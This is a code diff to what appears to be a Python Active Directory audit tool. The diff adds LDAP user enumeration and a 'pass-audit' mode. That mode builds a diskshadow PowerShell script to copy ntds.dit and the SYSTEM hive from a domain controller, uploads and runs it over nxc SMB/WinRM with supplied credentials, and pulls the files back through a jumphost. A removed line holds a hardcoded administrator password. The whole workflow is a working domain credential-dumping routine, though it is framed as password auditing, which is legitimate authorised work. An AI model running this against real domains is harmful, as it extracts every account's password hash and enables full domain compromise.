@@ -220,6 +220,9 @@ def en_users(jh, dc_ip, user, password, domain):
         print('The following tool is missing: ldapsearch')
         exit()
 
+    if '@' not in user:
+        user = user+'@'+domain
+            
     domain = domain.split('.')
     dns = ''
     for item in domain:
@@ -227,6 +230,8 @@ def en_users(jh, dc_ip, user, password, domain):
             dns += 'dc='+item
         else:
             dns += ',dc='+item
+
+    
     
     command1 = "ldapsearch -x -H ldap://" + dc_ip + " -D '" + user + "' -w '" + password + "' -E pr=1000/noprompt -b '" + dns + "' '(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))' sAMAccountName | grep -E '^sAMAccountName:' | cut -d ':' -f 2 | cut -d ' ' -f 2 > enabled_users"
 
@@ -385,7 +390,7 @@ def responder_run(jh, config_file=None):
 
 
 
-def pas_audit():
+def pas_audit(dc_ip, user, password, domain, jh=None):
     powershell_code = r'''
 $DiskshadowScript = @"
 set context persistent nowriters
@@ -394,7 +399,7 @@ set verbose on
 add volume c: alias temp
 create
 expose %temp% z:
-exec "cop.cmd"
+exec "C:\Windows\Temp\cop.cmd"
 delete shadows volume %temp%
 reset
 "@ -replace "`n", "`r`n"  # Force CR+LF line endings
@@ -405,11 +410,11 @@ reset
 $ScriptPath = "C:\Windows\Temp\ds.txt"
 $DiskshadowScript | Out-File -FilePath $ScriptPath -Encoding ASCII
     
-$outputFile = "diskshadow_output.txt"
+$outputFile = "C:\Windows\Temp\diskshadow_output.txt"
     
-echo 'copy z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit' | out-file ./cop.cmd -encoding ascii
-echo 'copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\copy-system.hive' | out-file ./cop.cmd -encoding ascii -append
-echo 'reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive"' | out-file ./cop.cmd -encoding ascii -append
+echo 'copy z:\Windows\NTDS\ntds.dit C:\Windows\Temp\ntds.dit' | out-file C:\Windows\Temp\cop.cmd -encoding ascii
+echo 'copy z:\Windows\System32\config\SYSTEM C:\Windows\Temp\copy-system.hive' | out-file C:\Windows\Temp\cop.cmd -encoding ascii -append
+echo 'reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive"' | out-file C:\Windows\Temp\cop.cmd -encoding ascii -append
     
 # Run DiskShadow with script and capture output
 diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
@@ -418,8 +423,53 @@ diskshadow.exe /s $ScriptPath | Tee-Object -FilePath $outputFile
     with open(f'audit.ps1', 'w') as f:
             f.write(powershell_code)
             
-    print(powershell_code)
-    command1 = "nxc smb 192.168.122.99 -u 'Administrator' -p 'Password1!' --put-file trial.ps1 \\\\Windows\\\\Temp\\\\trial.ps1"
+    # print(powershell_code)
+    if jh:
+
+        script = copy_files('audit.ps1', f'{jh}:~/audit.ps1')
+
+        command1 = r"nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --put-file audit.ps1 \\\\Windows\\\\Temp\\\\audit.ps1"
+
+        # print(command1)
+        print('uploading audit.ps1 file to the target.')
+        cp_audit = run_ssh_command(jh, command1)
+
+        command2 =  "nxc winrm "+dc_ip+" -u '"+user+"' -p '"+password+r"' -X 'C:\Windows\Temp\audit.ps1'"
+        
+        print('running diskshadow')
+        run_audit = run_ssh_command(jh, command2)        
+
+        command31 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\SYSTEM.hive SYSTEM.hive"
+        command32 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\copy-system.hive copy-system.hive"
+        command33 = "nxc smb "+dc_ip+" -u '"+user+"' -p '"+password+r"' --get-file  \\\\Windows\\\\Temp\\\\ntds.dit ntds.dit"
+
+        print('diskshadow done, grabbing files over on the jumphost')
+        jh_grab_audit1 = run_ssh_command(jh, command31)
+        jh_grab_audit2 = run_ssh_command(jh, command32)
+        jh_grab_audit3 = run_ssh_command(jh, command33)
+
+        # create local directory
+        create_local_dir = ['mkdir', f'password-audit']
+        create = subprocess.run(create_local_dir, capture_output=True, text=True)
+
+        print('grabbing files over from jumphost')
+        grab_audit1 = copy_files(f'{jh}:~/ntds.dit', 'password-audit/.')
+        grab_audit2 = copy_files(f'{jh}:~/copy-system.hive', 'password-audit/.')
+        grab_audit3 = copy_files(f'{jh}:~/SYSTEM.hive', 'password-audit/.')   
+
+        print('Grabbing enabled users and high priv users. If fails only run users module.')
+        users = en_users(jh, dc_ip, user, password, domain)
+
+        print('Everything seemed to work well. Now you have the necessary files to perform your password audit.')        
+
+        
+        # print('jumphost provided')
+
+    else:
+        print('jumphost not provided, this side of the module is not ready yet.')
+
+    
+    
 
     
 
@@ -515,8 +565,12 @@ def main():
             responder_run(args.jumphost)
 
     if args.mode == 'pass-audit':
-        pas_audit()
-        print('yes its password audit')
+        if args.jumphost:
+            pas_audit(args.dc_ip, args.user, args.password, args.domain, args.jumphost)
+        else:
+            pas_audit(args.dc_ip, args.user, args.password, args.domain)
+        # pas_audit()
+        # print('yes its password audit')
 
     if args.mode == 'parse' :
         print('Hello')
